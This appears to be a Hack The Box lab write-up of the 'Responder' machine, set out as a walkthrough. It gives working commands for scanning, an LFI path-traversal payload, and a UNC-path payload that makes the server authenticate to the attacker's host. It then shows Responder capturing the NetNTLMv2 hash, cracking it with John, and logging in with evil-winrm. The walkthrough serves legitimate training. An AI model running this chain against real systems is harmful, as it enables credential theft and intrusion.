---
title: "Responder – HTB Starting Point Write-Up"
date: 2026-05-18
categories: [HTB, Windows]
tags: [lfi, responder, netntlmv2, password-cracking, evil-winrm, web-security]
author: yvngdrac
---

# 🧠 Responder – HTB Starting Point Write-Up

**Author:** yvngdrac  
**Tier:** 1  
**Category:** Windows, LFI, Responder, NetNTLMv2, Password Cracking, Evil-WinRM  

---

## 🗒️ Introduction

Windows remains the dominant OS in enterprise environments, often configured with Active Directory and legacy authentication protocols like NTLM.  
This box demonstrates how a **File Inclusion vulnerability** can be abused to capture a **NetNTLMv2 challenge** via `Responder`, then crack it using `JohnTheRipper` to gain a shell with **Evil-WinRM**.

---

## 🔍 Enumeration

Performed an Nmap scan:

```bash
nmap -p- --min-rate 1000 -sV 10.129.187.37
```

**Discovered:**
- Port 80 (HTTP)
- Web application hosted

Added `unika.htb` to `/etc/hosts`:
```bash
echo "10.129.187.37 unika.htb" | sudo tee -a /etc/hosts
```

Visited the site and found a Unika web application.

---

## 📤 LFI Discovery

Found an input field that accepts page parameters. Tested for **Local File Inclusion**:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

**Result:** ✅ Confirmed LFI vulnerability - the server includes files from arbitrary paths.

---

## 🧪 Responder Setup

Started `Responder` on the attacker machine:

```bash
sudo responder -I tun0
```

Then configured the parameter to trigger an SMB connection to our listener:

```
http://unika.htb/?page=//10.10.14.17/somefile
```

---

## 🪝 NTLMv2 Hash Captured

**Responder** successfully captured a **NetNTLMv2 hash** for user `admin`:

```
admin::UNIKA:xxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:010100000000000000xxxxxxxxxxxxxx
```

Saved the hash to `hash.txt` for cracking.

---

## 🔓 Cracking the Hash

Used `JohnTheRipper` with the rockyou wordlist:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:** Cracked password: `badminton`

---

## 🩸 Shell Access – Evil-WinRM

Logged in using Evil-WinRM:

```bash
evil-winrm -i 10.129.187.37 -u admin -p badminton
```

Successfully gained shell access! Retrieved the flag:

```powershell
dir
type flag.txt
```

**Flag obtained!** 🚩

---

## 🔚 What I Learned

- How **NTLMv2** works and why it remains a security risk when combined with **LFI**
- Using **Responder** to capture NTLM hashes
- Cracking hashes with **JohnTheRipper**
- Practical use of **Evil-WinRM** for Windows reverse shells

---

## 🧰 Tools Used

- **Nmap** - Port scanning & service enumeration
- **Responder** - LLMNR/NBT-NS poisoning & hash capture
- **JohnTheRipper** - Hash cracking
- **Evil-WinRM** - Windows remote shell

---

## ✅ Final Thoughts

Even though this was a Starting Point machine, the attack chain reflects a **real-world vulnerability combination**:

```
LFI → SMB Relay → NTLMv2 Capture → Crack Creds → WinRM Shell
```

This box reinforces how outdated configurations and legacy protocols can still lead to full system compromise. A critical reminder that **defense-in-depth is essential** 💀.

---
